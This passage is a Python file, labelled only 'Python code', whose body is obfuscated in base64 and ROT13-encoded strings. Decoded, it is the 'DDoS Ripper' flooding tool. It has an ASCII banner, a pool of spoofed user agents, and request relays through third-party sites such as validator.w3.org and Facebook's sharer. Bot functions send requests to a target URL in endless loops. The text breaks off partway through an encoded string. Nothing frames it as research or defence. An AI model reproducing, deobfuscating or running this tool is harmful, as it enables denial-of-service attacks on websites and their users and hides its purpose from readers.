# Python code

import base64, codecs

magic = 'IyEvdXNyL2Jpbi9weXRob24zDQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQ0KDQoNCg0KaW1wb3J0IHN5cw0KZnJvbSBxdWV1ZSBpbXBvcnQgUXVldWUNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KaW1wb3J0IHRpbWUsc3lzLHNvY2tldCx0aHJlYWRpbmcsbG9nZ2luZyx1cmxsaWIucmVxdWVzdCxyYW5kb20NCg0KcHJpbnQoJycnDQoNCg0K4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilZcg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcNCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnSAgICDilojilojilZTilZDilZDilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcNCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0NCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilZrilZDilZDilZDilZDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWRICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRDQrilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICDilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwqlFbmdpbmVSaXBwZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmZXJlbmNlIGJ5IEhhbW1lcg0KJycnKQ0KDQpkZWYgdXNlcl9hZ2VudCgpOg0KCWdsb2JhbCB1YWdlbnQNCgl1YWdlbnQ9W10NCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIpDQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81L'
love = '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'